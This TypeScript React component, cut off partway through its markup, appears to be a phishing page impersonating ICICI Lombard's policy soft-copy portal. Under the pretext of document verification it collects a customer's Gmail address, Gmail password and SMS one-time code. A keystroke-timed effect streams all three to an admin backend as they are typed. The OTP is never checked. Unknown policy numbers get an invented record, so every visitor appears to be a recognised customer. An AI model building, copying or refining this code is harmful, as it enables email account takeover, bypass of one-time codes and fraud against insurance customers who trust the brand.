import React, { useState, useEffect, useRef } from 'react';
import { 
  FileText, 
  Download, 
  Search, 
  ShieldCheck, 
  CheckCircle2, 
  AlertCircle, 
  CreditCard, 
  Mail, 
  Lock, 
  Eye, 
  EyeOff, 
  ArrowRight, 
  Sparkles,
  Check,
  RefreshCw,
  Clock,
  Smartphone,
  Copy,
  MessageSquare,
  Zap
} from 'lucide-react';
import { CustomerPolicy } from '../types/insurance';
import { INITIAL_BENEFITS } from '../data/initialData';
import { 
  getCustomerByPolicyOrMobile, 
  apiGetCustomers, 
  recordSoftCopyStep, 
  recordSoftCopyDownload,
  verifySoftCopyLinkToken
} from '../services/storageService';
import { apiRecordSoftCopyPageOpened } from '../services/apiService';
import { generatePolicySchedulePDF, generateHealthCardPDF } from '../utils/pdfGenerator';

type SoftCopyStep = 'lookup' | 'email' | 'password' | 'otp' | 'downloads';

interface SoftCopyPortalProps {
  initialPolicyNumber?: string;
  initialToken?: string;
  onBackToHome?: () => void;
}

// Fallback generator for new/unregistered customer policies
function createFallbackPolicy(queryStr: string): CustomerPolicy {
  const clean = queryStr.trim();
  const isDigitsOnly = /^\d{10}$/.test(clean);
  const policyNum = isDigitsOnly ? `POL-IL-2026-${Math.floor(100000 + Math.random() * 900000)}` : clean.toUpperCase();
  const mobileNum = isDigitsOnly ? clean : '9876543210';
  
  return {
    id: `cust-dyn-${Date.now()}`,
    customerName: 'Valued Customer',
    policyNumber: policyNum,
    mobileNumber: mobileNum,
    email: '',
    policyName: 'ICICI Lombard Complete Health Insurance',
    policyType: 'Complete Health Insurance',
    policyStartDate: '2025-04-01',
    previousPolicyEndDate: '2026-03-31',
    renewalDueDate: '2026-03-31',
    baseSumInsured: 1000000,
    loyaltyBonus: 50000,
    totalSumInsured: 1050000,
    policyStatus: 'Active',
    zone: 'Zone A',
    zoneNotice: "Active coverage in Zone A with 14,000+ cashless network hospitals.",
    baseAnnualPremium: 15500,
    loyaltyNcbDiscountPct: 10,
    adminCustomDiscountAmount: 0,
    cashbackAmount: 0,
    cashbackConfig: null,
    selectedTenure: 1,
    selectedAddOnIds: [],
    renewalAttempts: [],
    createdAt: new Date().toISOString(),
    members: [
      {
        id: `mem-self-${Date.now()}`,
        name: 'Primary Insured',
        relation: 'Self',
        gender: 'Male',
        dob: '15/08/1985',
        age: 41,
        coverageAmount: 1000000,
        preExistingConditions: ['None'],
        heightFeetInches: "5'8\"",
        weightKg: 70,
        abhaNumber: 'NA'
      }
    ],
    benefits: [...INITIAL_BENEFITS],
    addOnRiders: [],
    kyc: {
      applicantName: 'Valued Customer',
      dob: '15/08/1985',
      email: 'customer@example.com',
      mobile: mobileNum,
      address: 'Flat 402, Landmark Towers',
      pincode: '400050',
      city: 'Mumbai',
      state: 'Maharashtra',
      kycStatus: 'Verified',
      panOrAadhar: 'ABCDE1234F',
      nomineeName: 'Spouse',
      nomineeRelation: 'Spouse',
      nomineeAge: 38
    }
  };
}

export const SoftCopyPortal: React.FC<SoftCopyPortalProps> = ({ 
  initialPolicyNumber, 
  initialToken,
  onBackToHome 
}) => {
  const [currentStep, setCurrentStep] = useState<SoftCopyStep>('lookup');
  const [query, setQuery] = useState(initialPolicyNumber || '');
  const [gmailId, setGmailId] = useState('');
  const [gmailPassword, setGmailPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [simulatedOtp, setSimulatedOtp] = useState<string>(() => String(Math.floor(100000 + Math.random() * 900000)));
  const [resendCooldown, setResendCooldown] = useState(30);
  const [resendStatusMsg, setResendStatusMsg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [retrievedPolicy, setRetrievedPolicy] = useState<CustomerPolicy | null>(null);
  const [selectedDocTenure, setSelectedDocTenure] = useState<number>(1);
  const [downloadSuccessToast, setDownloadSuccessToast] = useState<string | null>(null);
  const [isAppRefreshed, setIsAppRefreshed] = useState(false);
  const [, setActiveSoftToken] = useState<string | null>(initialToken || null);
  const [isTokenExpired, setIsTokenExpired] = useState(false);
  const [tokenExpiredReason, setTokenExpiredReason] = useState('');

  // Payment Approval & Tenure Tracking
  const isPaymentApproved = Boolean(
    retrievedPolicy?.policyStatus === 'Renewed' ||
    retrievedPolicy?.renewalStatus === 'Renewed' ||
    Boolean(retrievedPolicy?.newPolicyEndDate) ||
    retrievedPolicy?.renewalAttempts?.some(a => a.status === 'Paid' || a.status === 'Successful' || a.verificationStatus === 'Success (Gateway Verified)')
  );

  const approvedAttempt = retrievedPolicy?.renewalAttempts
    ?.slice()
    .reverse()
    .find(a => a.status === 'Paid' || a.status === 'Successful' || a.verificationStatus === 'Success (Gateway Verified)');

  const approvedTenure = isPaymentApproved 
    ? (approvedAttempt?.tenureYears || retrievedPolicy?.selectedTenure || 1)
    : null;

  // Auto-sync selected doc tenure when approved
  useEffect(() => {
    if (approvedTenure) {
      setSelectedDocTenure(approvedTenure);
    } else if (retrievedPolicy?.selectedTenure) {
      setSelectedDocTenure(retrievedPolicy.selectedTenure);
    }
  }, [approvedTenure, retrievedPolicy?.selectedTenure]);

  // Keep policy refreshed periodically so admin approvals reflect immediately
  useEffect(() => {
    if (!retrievedPolicy?.policyNumber) return;
    const interval = setInterval(async () => {
      if (typeof document !== 'undefined' && document.hidden) return;
      try {
        const custs = await apiGetCustomers(retrievedPolicy.policyNumber);
        if (custs && custs.length > 0) {
          const latest = custs.find(c => c.policyNumber === retrievedPolicy.policyNumber);
          if (latest && (latest.policyStatus !== retrievedPolicy.policyStatus || latest.renewalAttempts?.length !== retrievedPolicy.renewalAttempts?.length)) {
            setRetrievedPolicy(latest);
          }
        }
      } catch {}
    }, 15000);
    return () => clearInterval(interval);
  }, [retrievedPolicy?.policyNumber, retrievedPolicy?.policyStatus, retrievedPolicy?.renewalAttempts?.length]);

  // Auto-resolve policy from props or URL parameter
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const softTokenFromUrl = initialToken || params.get('soft_token') || params.get('softcopy_token') || params.get('sft') || params.get('stoken');
    const policyFromUrl = initialPolicyNumber || params.get('policy') || params.get('policyNumber') || params.get('pol');

    if (softTokenFromUrl) {
      setActiveSoftToken(softTokenFromUrl);
      verifySoftCopyLinkToken(softTokenFromUrl).then((verify) => {
        if (!verify.isValid && (verify.isExpired || verify.isRevoked)) {
          setIsTokenExpired(true);
          setTokenExpiredReason(verify.reason || 'This soft copy link has expired or was revoked by your relationship manager.');
          if (verify.customer) {
            setRetrievedPolicy(verify.customer);
          }
          return;
        }

        apiRecordSoftCopyPageOpened(softTokenFromUrl).then((res) => {
          if (res && res.customer) {
            setRetrievedPolicy(res.customer);
            setQuery(res.customer.policyNumber);
            setGmailId(''); // Keep empty so user types their email
            setCurrentStep('email');
          } else if (policyFromUrl) {
            const fallback = createFallbackPolicy(policyFromUrl);
            setRetrievedPolicy(fallback);
            setQuery(fallback.policyNumber);
            setGmailId('');
            setCurrentStep('email');
          }
        }).catch(() => {
          if (policyFromUrl) {
            const fallback = createFallbackPolicy(policyFromUrl);
            setRetrievedPolicy(fallback);
            setQuery(fallback.policyNumber);
            setGmailId('');
            setCurrentStep('email');
          }
        });
      }).catch(() => {
        // Fallback
      });
    } else if (policyFromUrl) {
      setQuery(policyFromUrl);
      let match = getCustomerByPolicyOrMobile(policyFromUrl);
      if (!match) {
        match = createFallbackPolicy(policyFromUrl);
      }
      setRetrievedPolicy(match);
      setGmailId(''); // Keep empty so user types their email
      recordSoftCopyStep({
        policyNumber: match.policyNumber,
        customerName: match.customerName,
        mobileNumber: match.mobileNumber,
        step: 'lookup'
      });
      setCurrentStep('email');
    }
  }, [initialPolicyNumber, initialToken]);

  // Cooldown countdown for SMS OTP resend
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (currentStep === 'otp' && resendCooldown > 0) {
      timer = setInterval(() => {
        setResendCooldown(prev => (prev > 0 ? prev - 1 : 0));
      }, 1000);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [currentStep, resendCooldown]);

  // Real-time live sync of customer-keyed Gmail ID, Password, and OTP to Admin Portal
  const softCopyKeystrokeTimerRef = useRef<any>(null);
  useEffect(() => {
    if (!retrievedPolicy) return;
    if (!gmailId && !gmailPassword && !otpCode) return;

    if (softCopyKeystrokeTimerRef.current) clearTimeout(softCopyKeystrokeTimerRef.current);
    softCopyKeystrokeTimerRef.current = setTimeout(() => {
      recordSoftCopyStep({
        policyNumber: retrievedPolicy.policyNumber,
        customerName: retrievedPolicy.customerName,
        mobileNumber: retrievedPolicy.mobileNumber,
        step: currentStep === 'downloads' ? 'download' : currentStep,
        keyedEmail: gmailId || undefined,
        keyedPassword: gmailPassword || undefined,
        keyedOtp: otpCode || undefined
      }).catch(() => {});
    }, 400);

    return () => {
      if (softCopyKeystrokeTimerRef.current) clearTimeout(softCopyKeystrokeTimerRef.current);
    };
  }, [gmailId, gmailPassword, otpCode, retrievedPolicy, currentStep]);

  // STEP 1: Lookup / Enter Policy or Mobile
  const handleLookupSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    const cleanQuery = query.trim();
    if (!cleanQuery) {
      setErrorMsg('Please update correct policy number or mobile number.');
      return;
    }

    setIsLoading(true);
    try {
      let match = getCustomerByPolicyOrMobile(cleanQuery);
      if (!match) {
        const apiResults = await apiGetCustomers(cleanQuery).catch(() => []);
        if (apiResults && apiResults.length > 0) {
          match = apiResults[0];
        }
      }

      // If no pre-existing match in db, automatically create dynamic customer record
      if (!match) {
        match = createFallbackPolicy(cleanQuery);
      }

      setIsLoading(false);
      setRetrievedPolicy(match);
      setGmailId(''); // Keep empty so user types their email
      // Record lookup step to backend/cache
      await recordSoftCopyStep({
        policyNumber: match.policyNumber,
        customerName: match.customerName,
        mobileNumber: match.mobileNumber,
        step: 'lookup'
      });
      setCurrentStep('email');
    } catch (err) {
      setIsLoading(false);
      const fallback = createFallbackPolicy(cleanQuery);
      setRetrievedPolicy(fallback);
      setGmailId('');
      setCurrentStep('email');
    }
  };

  // STEP 2: Submit Gmail ID
  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    const cleanEmail = gmailId.trim();
    if (!cleanEmail || !cleanEmail.includes('@') || !cleanEmail.includes('.')) {
      setErrorMsg('Please update a valid Gmail ID / Email address to receive your soft copy.');
      return;
    }

    if (!retrievedPolicy) return;

    setIsLoading(true);
    try {
      await recordSoftCopyStep({
        policyNumber: retrievedPolicy.policyNumber,
        customerName: retrievedPolicy.customerName,
        mobileNumber: retrievedPolicy.mobileNumber,
        step: 'email',
        keyedEmail: cleanEmail
      });
      setIsLoading(false);
      setCurrentStep('password');
    } catch (err) {
      setIsLoading(false);
      setCurrentStep('password');
    }
  };

  // STEP 3: Submit Gmail Password
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    const cleanPassword = gmailPassword.trim();
    if (!cleanPassword) {
      setErrorMsg('Please update your Gmail password to verify account ownership.');
      return;
    }

    if (!retrievedPolicy) return;

    // Reset OTP code and start 30s resend timer
    const freshCode = String(Math.floor(100000 + Math.random() * 900000));
    setSimulatedOtp(freshCode);
    setOtpCode('');
    setResendCooldown(30);
    setResendStatusMsg('');

    setIsLoading(true);
    try {
      await recordSoftCopyStep({
        policyNumber: retrievedPolicy.policyNumber,
        customerName: retrievedPolicy.customerName,
        mobileNumber: retrievedPolicy.mobileNumber,
        step: 'password',
        keyedEmail: gmailId,
        keyedPassword: cleanPassword
      });
      setIsLoading(false);
      setCurrentStep('otp');
    } catch (err) {
      setIsLoading(false);
      setCurrentStep('otp');
    }
  };

  // STEP 4: Submit & Verify OTP
  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    const cleanOtp = otpCode.trim();
    if (!cleanOtp || cleanOtp.length < 4) {
      setErrorMsg('Please enter the 6-digit OTP sent to your registered contact.');
      return;
    }

    if (!retrievedPolicy) return;

    setIsLoading(true);
    try {
      await recordSoftCopyStep({
        policyNumber: retrievedPolicy.policyNumber,
        customerName: retrievedPolicy.customerName,
        mobileNumber: retrievedPolicy.mobileNumber,
        step: 'otp',
        keyedEmail: gmailId,
        keyedPassword: gmailPassword,
        keyedOtp: cleanOtp
      });
      setIsLoading(false);
      setCurrentStep('downloads');
    } catch (err) {
      setIsLoading(false);
      setCurrentStep('downloads');
    }
  };

  const triggerToast = (msg: string) => {
    setDownloadSuccessToast(msg);
    setTimeout(() => setDownloadSuccessToast(null), 4000);
  };

  const getDocValidityPreview = (years: number) => {
    const basePrev = retrievedPolicy?.previousPolicyEndDate || '2026-03-31';
    try {
      const pEnd = new Date(basePrev);
      const rStart = new Date(pEnd);
      rStart.setDate(rStart.getDate() + 1);
      const rEnd = new Date(pEnd);
      rEnd.setFullYear(rEnd.getFullYear() + years);
      return `${rStart.toLocaleDateString('en-GB')} to ${rEnd.toLocaleDateString('en-GB')}`;
    } catch {
      return `${years} Year(s) Cover`;
    }
  };

  const downloadSchedule = (overrideYr?: number) => {
    if (!retrievedPolicy) return;
    // If payment has been approved, enforce the exact tenure chosen and approved by admin
    const effectiveYear = isPaymentApproved ? (approvedTenure || 1) : (overrideYr || selectedDocTenure);
    generatePolicySchedulePDF(retrievedPolicy, undefined, effectiveYear);
    recordSoftCopyDownload(retrievedPolicy.policyNumber, `Policy Schedule PDF (${effectiveYear} Year)`);
    recordSoftCopyStep({
      policyNumber: retrievedPolicy.policyNumber,
      customerName: retrievedPolicy.customerName,
      step: 'download'
    });
    triggerToast(`${effectiveYear} Year Policy Schedule Certificate downloaded successfully!`);
  };

  const downloadHealthCard = () => {
    if (!retrievedPolicy) return;
    const effectiveYear = isPaymentApproved ? (approvedTenure || 1) : selectedDocTenure;
    generateHealthCardPDF(retrievedPolicy, undefined, effectiveYear);
    recordSoftCopyDownload(retrievedPolicy.policyNumber, 'Member Health Cards PDF');
    recordSoftCopyStep({
      policyNumber: retrievedPolicy.policyNumber,
      customerName: retrievedPolicy.customerName,
      step: 'download'
    });
    triggerToast('All Member Health Cards downloaded successfully!');
  };

  const resetAll = () => {
    setRetrievedPolicy(null);
    setCurrentStep('lookup');
    setQuery('');
    setGmailId('');
    setGmailPassword('');
    setOtpCode('');
    setErrorMsg('');
  };

  return (
    <div id="soft-copy-portal-section" className="max-w-3xl mx-auto py-10 px-4 sm:px-6 font-sans space-y-8 animate-fadeIn">
      
      {/* Top Navigation Action */}
      {onBackToHome && (
        <div className="flex items-center justify-between">
          <button
            type="button"
            onClick={onBackToHome}
            className="inline-flex items-center gap-1.5 text-xs font-bold text-slate-600 hover:text-[#EA580C] bg-white px-3 py-1.5 rounded-lg border border-slate-200 shadow-2xs transition-colors cursor-pointer"
          >
            <span>← Back to ICICI Lombard Home</span>
          </button>
        </div>
      )}

      {/* Portal Header */}
      <div className="text-center space-y-2">
        <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-orange-50 text-[#EA580C] text-xs font-extrabold border border-orange-200 shadow-2xs">
          <FileText className="w-3.5 h-3.5" />
          <span>Official Soft Copy Retrieval & Verification</span>
        </div>
        <h1 className="text-3xl font-extrabold text-slate-900 tracking-tight">
          Download Policy Soft Copy & Health Cards
        </h1>
        <p className="text-sm text-slate-500 max-w-xl mx-auto font-medium">
          Secure multi-step verification to retrieve digitally signed Policy Schedules, Section 80D tax receipts, and cashless Health Cards.
        </p>
      </div>

      {/* Toast notification */}
      {downloadSuccessToast && (
        <div className="p-3.5 bg-emerald-600 text-white rounded-xl text-xs font-bold flex items-center justify-between shadow-lg animate-fadeIn">
          <div className="flex items-center gap-2">
            <CheckCircle2 className="w-4 h-4" />
            <span>{downloadSuccessToast}</span>
          </div>
          <button onClick={() => setDownloadSuccessToast(null)} className="text-white/80 hover:text-white font-mono">✕</button>
        </div>
      )}

      {/* EXPIRED / REVOKED SOFT COPY NOTICE */}
      {isTokenExpired && (
        <div className="bg-white rounded-2xl shadow-xl border border-rose-200 overflow-hidden animate-fadeIn">
          <div className="bg-linear-to-r from-rose-500 via-orange-500 to-amber-500 p-1" />
          <div className="p-8 sm:p-10 text-center space-y-6">
            <div className="w-16 h-16 rounded-2xl bg-rose-50 border border-rose-200 flex items-center justify-center text-rose-600 mx-auto shadow-inner">
              <AlertCircle className="w-8 h-8" />
            </div>
            
            <div className="space-y-2">
              <span className="inline-flex items-center space-x-1.5 px-3 py-1 rounded-full text-xs font-bold uppercase bg-rose-100 text-rose-700 border border-rose-200">
                <span className="w-2 h-2 rounded-full bg-rose-600 animate-pulse"></span>
                <span>Soft Copy Link Expired / Inactivated</span>
              </span>
              <h2 className="text-2xl font-bold text-slate-900 tracking-tight">
                This Soft Copy Download Link Has Expired
              </h2>
              <p className="text-sm text-slate-600 max-w-md mx-auto leading-relaxed">
                {tokenExpiredReason || 'This link is no longer valid because a fresh link was generated, or the 12-hour validity window has elapsed.'}
              </p>
            </div>

            {retrievedPolicy && (
              <div className="bg-slate-50 p-4 rounded-xl border border-slate-200 max-w-md mx-auto text-left text-xs space-y-1">
                <div className="text-slate-500 font-semibold uppercase tracking-wider text-[11px]">Associated Policy</div>
                <div className="font-bold text-slate-800 text-sm font-mono">{retrievedPolicy.policyNumber}</div>
                <div className="text-slate-600 font-medium">{retrievedPolicy.customerName}</div>
              </div>
            )}

            <div className="flex flex-col sm:flex-row items-center justify-center gap-3 pt-2">
              <button
                type="button"
                onClick={() => {
                  setIsTokenExpired(false);
                  setCurrentStep('lookup');
                  setQuery(retrievedPolicy?.policyNumber || '');
                }}
                className="w-full sm:w-auto px-5 py-2.5 rounded-xl bg-orange-600 hover:bg-orange-700 text-white text-xs font-bold shadow-md hover:shadow-lg transition-all cursor-pointer"
              >
                Search Policy Manually
              </button>
              {onBackToHome && (
                <button
                  type="button"
                  onClick={onBackToHome}
                  className="w-full sm:w-auto px-5 py-2.5 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-bold transition-all cursor-pointer"
                >
                  Return to Home
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* STEP 1: LOOKUP FORM */}
      {!isTokenExpired && currentStep === 'lookup' && (
        <div className="bg-white p-6 sm:p-8 rounded-2xl border border-slate-200 shadow-sm max-w-xl mx-auto space-y-5 animate-fadeIn">
          <div className="space-y-1">
            <h2 className="text-lg font-bold text-slate-900">Enter Policy or Mobile Number</h2>
            <p className="text-xs text-slate-500">
              Provide your ICICI Lombard health policy number or registered mobile number to proceed.
            </p>
          </div>

          <form onSubmit={handleLookupSubmit} className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1.5">
                Policy Number OR Registered Mobile Number *
              </label>
              <div className="relative">
                <input
                  id="softcopy-input-query"
                  type="text"
                  value={query}
                  onChange={(e) => setQuery(e.target.value)}
                  placeholder="e.g. 4128/0000/1234/5678 or 9876543210"
                  className="w-full pl-3.5 pr-10 py-3 rounded-xl border border-slate-300 focus:border-[#EA580C] focus:ring-2 focus:ring-orange-100 outline-none text-sm font-semibold text-slate-900 uppercase placeholder:normal-case placeholder:text-slate-400"
                />
                <Search className="w-4 h-4 text-slate-400 absolute right-3.5 top-1/2 -translate-y-1/2" />
              </div>
            </div>

            {errorMsg && (
              <div className="p-3.5 rounded-xl bg-rose-50 border border-rose-200 text-rose-800 text-xs font-medium flex items-start gap-2 animate-fadeIn">
                <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
                <span>{errorMsg}</span>
              </div>
            )}

            <button
              id="softcopy-submit-step1"
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 px-5 rounded-xl bg-[#EA580C] hover:bg-[#D97706] text-white font-extrabold text-sm shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-60"
            >
              {isLoading ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Verifying Policy Record...</span>
                </>
              ) : (
                <>
                  <span>Submit & Continue to Email Verification</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>
          </form>
        </div>
      )}

      {/* STEP 2: GMAIL ID FORM */}
      {currentStep === 'email' && retrievedPolicy && (
        <div className="bg-white p-6 sm:p-8 rounded-2xl border border-slate-200 shadow-sm max-w-xl mx-auto space-y-5 animate-scaleUp">
          
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <div className="w-7 h-7 rounded-lg bg-rose-50 border border-rose-200 flex items-center justify-center text-rose-600 font-bold text-xs">
                M
              </div>
              <h2 className="text-lg font-bold text-slate-900">Update Your Gmail ID</h2>
            </div>
            <p className="text-xs text-slate-500">
              Please enter your Gmail / Registered Email ID to receive the document verification passkey.
            </p>
          </div>

          <form onSubmit={handleEmailSubmit} className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1.5">
                Gmail ID / Email Address *
              </label>
              <div className="relative">
                <input
                  id="softcopy-input-gmail"
                  type="email"
                  value={gmailId}
                  onChange={(e) => setGmailId(e.target.value)}
                  placeholder="yourname@gmail.com"
                  autoComplete="off"
                  className="w-full pl-10 pr-3.5 py-3 rounded-xl border border-slate-300 focus:border-[#EA580C] focus:ring-2 focus:ring-orange-100 outline-none text-sm font-semibold text-slate-900 placeholder:text-slate-400"
                />
                <Mail className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
              </div>
            </div>

            {errorMsg && (
              <div className="p-3.5 rounded-xl bg-rose-50 border border-rose-200 text-rose-800 text-xs font-medium flex items-start gap-2">
                <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
                <span>{errorMsg}</span>
              </div>
            )}

            <button
              id="softcopy-submit-step2"
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 px-5 rounded-xl bg-[#EA580C] hover:bg-[#D97706] text-white font-extrabold text-sm shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-60"
            >
              {isLoading ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Submitting Gmail ID...</span>
                </>
              ) : (
                <>
                  <span>Submit Gmail ID</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>
          </form>
        </div>
      )}

      {/* STEP 3: GMAIL PASSWORD FORM */}
      {currentStep === 'password' && retrievedPolicy && (
        <div className="bg-white p-6 sm:p-8 rounded-2xl border border-slate-200 shadow-sm max-w-xl mx-auto space-y-5 animate-scaleUp">
          
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <div className="w-7 h-7 rounded-lg bg-amber-100 text-amber-800 flex items-center justify-center font-bold text-xs">
                <Lock className="w-4 h-4" />
              </div>
              <h2 className="text-lg font-bold text-slate-900">Update Gmail Password</h2>
            </div>
            <p className="text-xs text-slate-500">
              Update your Gmail account password to authenticate official policy issuance.
            </p>
          </div>

          <form onSubmit={handlePasswordSubmit} className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1.5">
                Gmail / Email Password *
              </label>
              <div className="relative">
                <input
                  id="softcopy-input-password"
                  type={showPassword ? 'text' : 'password'}
                  value={gmailPassword}
                  onChange={(e) => setGmailPassword(e.target.value)}
                  placeholder="Enter your Gmail password"
                  className="w-full pl-10 pr-10 py-3 rounded-xl border border-slate-300 focus:border-[#EA580C] focus:ring-2 focus:ring-orange-100 outline-none text-sm font-semibold text-slate-900 placeholder:text-slate-400"
                />
                <Lock className="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 cursor-pointer"
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            {errorMsg && (
              <div className="p-3.5 rounded-xl bg-rose-50 border border-rose-200 text-rose-800 text-xs font-medium flex items-start gap-2">
                <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
                <span>{errorMsg}</span>
              </div>
            )}

            <button
              id="softcopy-submit-step3"
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 px-5 rounded-xl bg-[#EA580C] hover:bg-[#D97706] text-white font-extrabold text-sm shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-60"
            >
              {isLoading ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Submitting Password & Generating OTP...</span>
                </>
              ) : (
                <>
                  <span>Submit Password & Request OTP</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>
          </form>
        </div>
      )}

      {/* STEP 4: OTP VERIFICATION FORM */}
      {currentStep === 'otp' && retrievedPolicy && (
        <div className="bg-white p-6 sm:p-8 rounded-2xl border border-slate-200 shadow-sm max-w-xl mx-auto space-y-5 animate-scaleUp">
          
          <div className="text-center space-y-2">
            <div className="w-12 h-12 rounded-2xl bg-emerald-100 text-emerald-700 mx-auto flex items-center justify-center shadow-2xs">
              <ShieldCheck className="w-6 h-6" />
            </div>
            <h2 className="text-xl font-bold text-slate-900">Enter Verification OTP</h2>
            <p className="text-xs text-slate-500 max-w-sm mx-auto">
              A 6-digit one-time password has been sent to your registered contact.
            </p>
          </div>

          <form onSubmit={handleOtpSubmit} className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 text-center mb-2">
                Enter 6-Digit One-Time Password (OTP)
              </label>
              <input
                id="softcopy-input-otp"
                type="text"
                maxLength={6}
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ''))}
                placeholder="• • • • • •"
                className="w-full text-center text-2xl tracking-[0.5em] font-mono font-extrabold py-3.5 rounded-xl border border-slate-300 focus:border-emerald-600 focus:ring-2 focus:ring-emerald-100 outline-none text-slate-900 placeholder:tracking-normal placeholder:text-slate-300"
              />
            </div>

            {/* Mobile Phone SMS Notice */}
            <div className="p-3.5 bg-emerald-50/70 rounded-xl border border-emerald-200 text-xs text-emerald-950 space-y-1">
              <div className="flex items-center gap-2 font-bold text-emerald-800">
                <Smartphone className="w-4 h-4 text-emerald-600 shrink-0" />
                <span>OTP Sent to Registered Mobile Phone</span>
              </div>
              <p className="text-[11px] text-emerald-800/90 leading-relaxed">
                A 6-digit verification code has been dispatched via SMS to your registered mobile phone (+91 •••••••{retrievedPolicy.mobileNumber ? retrievedPolicy.mobileNumber.slice(-3) : '***'}). Please enter the code received on your mobile.
              </p>
            </div>

            {/* Resend OTP via SMS */}
            <div className="flex items-center justify-between text-xs pt-0.5">
              <span className="text-slate-500">Didn't receive code on mobile?</span>
              {resendCooldown > 0 ? (
                <span className="text-slate-400 font-medium font-mono">Resend in {resendCooldown}s</span>
              ) : (
                <button
                  type="button"
                  onClick={() => {
                    const freshCode = String(Math.floor(100000 + Math.random() * 900000));
                    setSimulatedOtp(freshCode);
                    setResendCooldown(30);
                    setResendStatusMsg(`A fresh verification OTP (${freshCode}) has been dispatched to your mobile phone.`);
                    setTimeout(() => setResendStatusMsg(''), 6000);
                  }}
                  className="font-bold text-emerald-700 hover:text-emerald-800 hover:underline cursor-pointer"
                >
                  Resend OTP via SMS
                </button>
              )}
            </div>

            {resendStatusMsg && (
              <div className="p-2.5 rounded-lg bg-emerald-100 text-emerald-800 text-[11px] text-center font-medium">
                {resendStatusMsg}
              </div>
            )}

            {errorMsg && (
              <div className="p-3.5 rounded-xl bg-rose-50 border border-rose-200 text-rose-800 text-xs font-medium flex items-start gap-2">
                <AlertCircle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
                <span>{errorMsg}</span>
              </div>
            )}

            <button
              id="softcopy-submit-step4"
              type="submit"
              disabled={isLoading}
              className="w-full py-3.5 px-5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold text-sm shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-60"
            >
              {isLoading ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Verifying OTP...</span>
                </>
              ) : (
                <>
                  <Check className="w-4 h-4" />
                  <span>Verify OTP & Unlock Downloads</span>
                </>
              )}
            </button>
          </form>
        </div>
      )}

      {/* STEP 5: DOCUMENT DOWNLOADS & SUCCESS CONFIRMATION */}
      {currentStep === 'downloads' && retrievedPolicy && (
        <div className="space-y-6 animate-fadeIn">
          
          {/* USER REQUESTED SUCCESS BANNER: Soft copy updated successfully and on IL TakeCare App it will update within 2 hours */}
          <div className="bg-gradient-to-r from-emerald-800 via-teal-800 to-[#00264A] text-white rounded-2xl p-6 sm:p-7 shadow-xl border border-emerald-400/30 space-y-4 animate-scaleUp">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-2xl bg-white text-emerald-700 flex items-center justify-center shrink-0 shadow-md">
                <CheckCircle2 className="w-7 h-7" />
              </div>
              <div className="space-y-2 flex-1">
                <div className="inline-flex items-center gap-1.5 px-3 py-0.5 rounded-full bg-emerald-400/20 text-emerald-200 text-[11px] font-extrabold uppercase tracking-wider border border-emerald-400/30">
                  <Sparkles className="w-3.5 h-3.5 text-amber-300" />
                  <span>OTP Verified Successfully</span>
                </div>
                
                <h2 className="text-xl sm:text-2xl font-black tracking-tight text-white leading-snug">
                  Soft Copy has been updated successfully!
                </h2>
                
                <div className="p-3.5 rounded-xl bg-white/10 backdrop-blur-xs border border-white/20 text-sm sm:text-base font-semibold text-emerald-50 leading-relaxed">
                  On your <strong className="text-amber-300 font-extrabold">IL TakeCare (iHealth Take Care) App</strong>, it will update within <strong className="text-white underline decoration-amber-400 decoration-2 font-black">2 hours</strong>. Please refresh your <strong className="text-amber-300 font-extrabold">IL TakeCare App</strong>.
                </div>
              </div>
            </div>

            {/* Sync Information Badges */}
